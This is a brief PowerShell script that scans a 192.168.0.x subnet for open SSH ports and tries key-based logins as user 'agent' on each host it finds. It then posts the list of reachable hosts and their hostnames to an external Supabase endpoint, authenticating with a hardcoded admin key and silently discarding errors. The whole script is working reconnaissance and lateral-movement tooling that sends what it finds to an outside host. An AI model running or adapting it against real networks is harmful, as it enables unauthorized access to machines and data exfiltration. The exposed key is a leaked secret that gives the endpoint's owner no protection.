$ErrorActionPreference='Continue'
$U='https://kowtvvrgpzgrdlnxasxw.supabase.co/functions/v1/admin-tools'
$K=@{ 'x-admin-key'='2715a48023e02d230e29e11f1ac4a848b8d79b934ed89264' }
function Send-Log($n,$t){ try{ Invoke-RestMethod -Method Post -Uri $U -Headers $K -ContentType 'application/json; charset=utf-8' -Body (@{action='log';name=$n;text=[string]$t}|ConvertTo-Json -Compress)|Out-Null }catch{} }
Send-Log 'worker_probe_log' 'probe3-started'
$L=@()
try{
  $open=@()
  1..254 | ForEach-Object {
    $ipa="192.168.0.$_"
    $c=New-Object Net.Sockets.TcpClient
    $ar=$c.BeginConnect($ipa,22,$null,$null)
    if($ar.AsyncWaitHandle.WaitOne(120) -and $c.Connected){ $open+=$ipa }
    $c.Close()
  }
  $L += "ssh22 open: " + ($open -join ', ')
  foreach($ipa in $open){
    $r = (ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=accept-new -o BatchMode=yes "agent@$ipa" "echo KEYOK; hostname" 2>&1)
    $L += "agent@${ipa}: " + (($r|ForEach-Object{[string]$_}) -join ' | ')
  }
}catch{ $L += "EXCEPTION: $_" }
Send-Log 'worker_probe_log' (($L|ForEach-Object{[string]$_}) -join "`n")
Start-Sleep 4
